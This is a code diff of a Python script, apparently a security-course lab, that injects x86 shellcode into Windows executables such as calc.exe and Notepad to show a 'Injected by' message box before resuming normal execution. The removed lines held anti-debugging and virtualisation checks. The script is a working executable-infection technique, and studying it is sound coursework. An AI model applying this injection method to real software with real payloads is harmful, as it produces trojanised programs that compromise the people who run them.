@@ -40,16 +40,7 @@ def align(value, alignment):
 
 
 def create_shell_code(virtual_address_of_caption, virtual_address_of_text, jump_address, address_of_message_box_w):
-    shell_code = b'\x33\xC0'
-    shell_code += b'\x40'
-    shell_code += b'\x0F\xA2'
-    shell_code += b'\x0F\xBA\xE1\x1F'
-    shell_code += b'\x72\x22'
-    shell_code += b'\x64\xFF\x35\x30\x00\x00\x00'
-    shell_code += b'\x5A'
-    shell_code += b'\x80\x7A\x02\x01'
-    shell_code += b'\x74\x14'
-    shell_code += b'\x6A\x00'
+    shell_code = b'\x6A\x00'
     shell_code += b'\x68' + struct.pack("I", virtual_address_of_caption)
     shell_code += b'\x68' + struct.pack("I", virtual_address_of_text)
     shell_code += b'\x6A\x00'
@@ -58,34 +49,34 @@ def create_shell_code(virtual_address_of_caption, virtual_address_of_text, jump_
     shell_code += b'\xE9' + struct.pack("I", jump_address)
     shell_code += b'\x00' * 30
     shell_code += b'\x49\x00\x6e\x00\x66\x00\x6f\x00'
-    shell_code += b'\x00' * 24
+    shell_code += b'\x00' * 33  
     shell_code += b'\x49\x00\x6E\x00\x6A\x00\x65\x00\x63\x00\x74\x00\x65\x00\x64\x00\x20\x00\x62\x00\x79\x00\x20\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x33\x00\x39\x00\x20\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x30\x00\x34\x00\x20\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x31\x00\x37'
 
     return shell_code
 
 
-def add_more_space(path):
+def add_more_space(input, output):
+    shutil.copy2(input, output)
     # Get original_size and add more space to file pe
     print("[*] Resize the Executable")
 
-    original_size = os.path.getsize(path)
+    original_size = os.path.getsize(output)
     print("\t[+] Original Size = ", hex(original_size))
-    fd = open(path, 'a+b')
+    fd = open(output, 'a+b')
     map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
     map.resize(original_size + 0x1000)
     map.close()
     fd.close()
 
-    print("\t[+] New Size = :", hex(os.path.getsize(path)))
+    print("\t[+] New Size = :", hex(os.path.getsize(output)))
     return original_size
 
 
 def injected_shell_code(input, output):
     # Path to pe file
-    path = input
-    pe = pefile.PE(path)
     
-    original_size = add_more_space(path)
+    original_size = add_more_space(input, output)
+    pe = pefile.PE(output)
     raw_address_of_shell_code = original_size 
     print("raw address shellcode: ", hex(raw_address_of_shell_code))
     number_of_sections = get_info_section(pe)
@@ -104,7 +95,6 @@ def injected_shell_code(input, output):
     last_section_raw_offset = last_section.PointerToRawData + last_section.SizeOfRawData
 
     # Locate where to inject shell_code
-    # raw_address_of_shell_code = original_size
     raw_address_of_caption = raw_address_of_shell_code + 0x50
     raw_address_of_text = raw_address_of_shell_code + 0x70
 
@@ -130,7 +120,10 @@ def injected_shell_code(input, output):
     # Inject shell code
     print("\nShell-code : ")
     print(shell_code)
-    print("Inject at : ", hex(raw_address_of_shell_code))
+    
+    print("Inject shell_code at : ", hex(raw_address_of_shell_code))
+    print("Inject Caption at: ", hex(raw_address_of_caption))
+    print("Inject text at: ", hex(raw_address_of_text))
     pe.set_bytes_at_offset(raw_address_of_shell_code, shell_code)
 
     # Resize VirtualSize and RawData
@@ -139,13 +132,16 @@ def injected_shell_code(input, output):
     last_section.SizeOfRawData += 0x1000
     pe.OPTIONAL_HEADER.SizeOfImage += 0x1000
 
-    pe.write(path)
+    pe.write(output)
     print("Inject Successfully!!")
 
 file = [
-    'Test/calc.exe'
+    'NOTEPAD.exe',
+    'calc.exe'
 ]
 
 for input_file in file :
     output_file = input_file.replace('.exe', '-injected.exe')
+    print("\nInjecting ", input_file)
+    print("\n")
     injected_shell_code(input_file, output_file)
